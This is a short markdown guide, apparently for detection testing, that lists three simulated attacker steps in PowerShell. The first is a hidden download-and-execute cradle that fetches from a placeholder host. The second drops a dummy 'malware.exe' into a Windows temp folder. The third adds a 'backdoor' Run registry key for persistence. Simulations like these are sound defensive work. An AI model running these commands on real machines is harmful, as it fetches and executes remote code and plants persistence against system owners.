# Attack Simulation Steps

## 1. PowerShell Execution

```powershell
powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://example.com')"
```

**Description:**
Simulates a malicious PowerShell command used by attackers to download and execute payloads.

---

## 2. File Drop Simulation

```powershell
echo "test" > C:\Windows\Temp\malware.exe
```

**Description:**
Simulates dropping a malicious executable file in a system directory.

---

## 3. Persistence via Registry

```powershell
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v backdoor /t REG_SZ /d "C:\Windows\Temp\malware.exe"
```

**Description:**
Simulates persistence by adding a registry key to execute malware at startup.
